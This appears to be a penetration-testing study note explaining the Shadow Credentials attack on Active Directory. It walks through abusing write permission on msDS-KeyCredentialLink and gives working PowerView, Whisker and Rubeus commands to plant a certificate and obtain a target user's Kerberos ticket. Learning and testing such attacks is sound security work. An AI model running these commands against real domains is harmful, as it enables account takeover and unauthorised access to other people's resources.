### Shadow Credential

- What is Shadow Credentials?
  - It's an attack that lets you take over any Active Directory user/computer account if you have Write permissions on that object, by adding a "shadow" certificate that you control.

- The Core Idea in Simple Terms : Imagine every user account has a "key rack" where they can store different types of keys (passwords, certificates, etc.).

- Shadow Credentials attack:

  - You find an account where you have permission to add new keys to their key rack
  - You add your own certificate to their key rack
  - You then use your certificate to authenticate as that user
  - You've effectively taken over their account without knowing their password!

- Step-by-Step Attack Flow
- Prerequisites: You have Write or GenericWrite permissions on a target account.AD Certificate Services (AD CS) is running in the domain

- Step 1: Find Vulnerable Accounts : Using BloodHound or PowerView, find accounts where you have write permissions:

```
Find users you can write to
Get-DomainUser | Get-DomainObjectAcl | ? {$_.ActiveDirectoryRights -match "WriteProperty"}
```

- Step 2: Add Your Certificate to Target : The attack adds a certificate to the target's msDS-KeyCredentialLink attribute:
  
```
Target User: alice@company.com
     ↓
You add your certificate to alice's msDS-KeyCredentialLink
     ↓  
Active Directory now thinks: "Alice has multiple ways to authenticate, including this new certificate"
```

- Step 3: Authenticate with Your Certificate : Now you can use PKINIT to authenticate as Alice using your certificate

```
# Use your certificate to get a TGT as Alice
Rubeus asktgt /user:alice /certificate:yourcert.pfx /password:certpass
```

- Step 4: Get Access : You receive a valid TGT for Alice that you can use to access resources as her!

- Technical Details
```
The Vulnerable Attribute: msDS-KeyCredentialLink
Stores public keys for certificate-based authentication
Having Write permission on this attribute lets you add your own keys
The attribute is used for WHfB (Windows Hello for Business) and modern auth
```

```
[You have Write on alice@company.com]
     ↓
[Generate RSA keypair (public/private key)]
     ↓
[Add public key to alice's msDS-KeyCredentialLink]
     ↓
[Use private key to authenticate as alice via PKINIT]
     ↓
[Get TGT as alice → Access resources as alice]
```

- Practical Example : Using Whisker (Shadow Credentials tool):

```
# Step 1: Add shadow credential to target user
Whisker.exe add /target:alice

# Output: Generated certificate saved to alice.pfx

# Step 2: Use the certificate to get TGT as Alice
Rubeus asktgt /user:alice /certificate:alice.pfx /password:password /ptt

# Step 3: Now you have Alice's TGT in memory!
```

- What Happens Behind the Scenes:
  - Whisker generates an RSA keypair
  - Adds public key to alice's msDS-KeyCredentialLink
  - Saves private key as alice.pfx
  - You use the PFX to authenticate as Alice
 
- Why This Attack Works
  - Legitimate Feature Abuse:
    - msDS-KeyCredentialLink is meant for passwordless authentication . It allows multiple authentication methods per user . You're abusing the "add your own certificate" capability
   
#### Note : msDS-KeyCredentialLink is an Active Directory attribute that stores public keys for certificate-based authentication


